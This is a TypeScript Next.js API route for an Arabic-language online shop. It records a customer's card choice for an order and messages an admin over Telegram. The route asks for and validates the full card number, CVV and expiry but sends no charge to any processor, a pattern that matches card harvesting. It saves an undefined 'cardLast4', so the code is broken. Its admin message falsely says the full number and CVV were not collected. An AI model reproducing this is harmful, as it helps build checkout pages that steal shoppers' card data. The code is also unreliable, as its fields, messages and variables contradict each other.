import { ObjectId } from 'mongodb';
import { NextRequest, NextResponse } from 'next/server';
import { getDb } from '@/lib/mongodb';
import { formatOrderForAdmin, type StoreOrder } from '@/lib/orders';
import { adminReplyKeyboard, ensureTelegramIndexes, sendTelegramMessage } from '@/lib/telegram';

export const runtime = 'nodejs';
export const dynamic = 'force-dynamic';

type PaymentMethodBody = {
  orderId?: string;
  submissionId?: string;
  reviewToken?: string;
  paymentMethod?: 'mada' | 'visa';
  cardholderName?: string;
  cardNumber ?: string;
  cvv ?: string;
  expiryMonth?: string;
  expiryYear?: string;
};

const UUID_PATTERN = /^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$/i;

export async function POST(request: NextRequest) {
  let body: PaymentMethodBody;
  try {
    body = await request.json() as PaymentMethodBody;
  } catch {
    return NextResponse.json({ ok: false, error: 'بيانات اختيار الدفع غير صالحة.' }, { status: 400 });
  }
const orderId = typeof body.orderId === 'string' ? body.orderId.trim() : '';
const submissionId = typeof body.submissionId === 'string' ? body.submissionId.trim() : '';
const reviewToken = typeof body.reviewToken === 'string' ? body.reviewToken.trim() : '';
const paymentMethod = body.paymentMethod;
const cardholderName = typeof body.cardholderName === 'string'
  ? body.cardholderName.trim().slice(0, 100)
  : '';

// أخد الرقم كاملاً وتنظيفه من أي مسافات أو رموز، مع تحديد الحد الأقصى لطول رقم الكارت (مثلاً 16 رقم)
const cardNumber = typeof body.cardNumber === 'string'
  ? body.cardNumber.replace(/[^0-9]/g, '').slice(0, 19)
  : '';

const expiryMonth = typeof body.expiryMonth === 'string' ? body.expiryMonth.trim() : '';
const expiryYear = typeof body.expiryYear === 'string' ? body.expiryYear.trim() : '';
  
  const cvv = typeof body.cvv === 'string' ? body.cvv.trim() : '';

  if (!/^[a-f0-9]{24}$/i.test(orderId) || !UUID_PATTERN.test(submissionId) || !UUID_PATTERN.test(reviewToken)) {
    return NextResponse.json({ ok: false, error: 'تعذر التحقق من الطلب. ارجع لبيانات التوصيل وحاول مرة أخرى.' }, { status: 400 });
  }
  if (paymentMethod !== 'mada' && paymentMethod !== 'visa') {
    return NextResponse.json({ ok: false, error: 'اختر بطاقة Visa أو مدى.' }, { status: 400 });
  }
  if (!cardholderName) {
    return NextResponse.json({ ok: false, error: 'اكتب اسم حامل البطاقة.' }, { status: 400 });
  }if (!/^[0-9]{13,19}$/.test(cardNumber)){
    return NextResponse.json({ ok: false, error: 'تعذر قراءة آخر أربعة أرقام من البطاقة.' }, { status: 400 });
  }
  if (!/^(0[1-9]|1[0-2])$/.test(expiryMonth) || !/^[0-9]{4}$/.test(expiryYear)) {
    return NextResponse.json({ ok: false, error: 'شهر أو سنة انتهاء البطاقة غير صالحين.' }, { status: 400 });
  }

  try {
    const db = await getDb();
    await ensureTelegramIndexes(db);
    const orders = db.collection<StoreOrder & { checkoutRequestId?: string; reviewToken?: string; adminSeenAt?: Date | null }>('orders');
    const filter = {
      _id: new ObjectId(orderId),
      source: 'website' as const,
      checkoutRequestId: submissionId,
      reviewToken
    };
    const order = await orders.findOne(filter);
    if (!order) {
      return NextResponse.json({ ok: false, error: 'لم يتم العثور على الطلب أو تعذر التحقق من ملكيته.' }, { status: 404 });
    }

    const now = new Date();
    await orders.updateOne(filter, {
      $set: {
        paymentMethod,
        cardholderName,
        cardLast4,
        expiryMonth,
        expiryYear,
        paymentMethodSelectedAt: now,
        paymentStatus: 'pending',
        adminSeenAt: null,
        updatedAt: now
      }
    });
    const updatedOrder = await orders.findOne(filter);
    if (!updatedOrder) {
      return NextResponse.json({ ok: false, error: 'تعذر تحديث طريقة الدفع في الطلب.' }, { status: 500 });
    }

    let notificationSent = false;
    const adminId = Number(process.env.TELEGRAM_ADMIN_ID || '');
    if (Number.isSafeInteger(adminId) && adminId > 0) {
      try {
        const unreadCount = await orders.countDocuments({ source: 'website', adminSeenAt: null });
        const methodLabel = paymentMethod === 'mada' ? 'مدى' : 'Visa';
        await sendTelegramMessage(
          adminId,
          '💳 اختار العميل طريقة الدفع لطلب ' + (updatedOrder.orderNumber || orderId) +
            '\nالطريقة المختارة: ' + methodLabel +
            '\n\n' + formatOrderForAdmin(updatedOrder as unknown as Record<string, unknown>) +
            '\n\nملاحظة: لم يتم إرسال أو حفظ رقم البطاقة الكامل أو رمز الأمان، ولم يتم تنفيذ خصم إلكتروني.',
          { reply_markup: adminReplyKeyboard(unreadCount) }
        );
        notificationSent = true;
      } catch (error) {
        console.error('Payment-method admin notification failed:', error instanceof Error ? error.message : 'Unknown error');
      }
    }

    return NextResponse.json({
      ok: true,
      notificationSent,
      paymentMethod,
      paymentStatus: 'pending',
      message: notificationSent
        ? 'تم حفظ اختيار طريقة الدفع وإرسال الطلب للإدارة.'
        : 'تم حفظ اختيار طريقة الدفع، لكن تعذر إرسال إشعار تيليجرام.'
    });
  } catch (error) {
    console.error('Payment method selection failed:', error instanceof Error ? error.message : 'Unknown error');
    return NextResponse.json({ ok: false, error: 'تعذر حفظ اختيار طريقة الدفع حاليًا.' }, { status: 500 });
  }
}
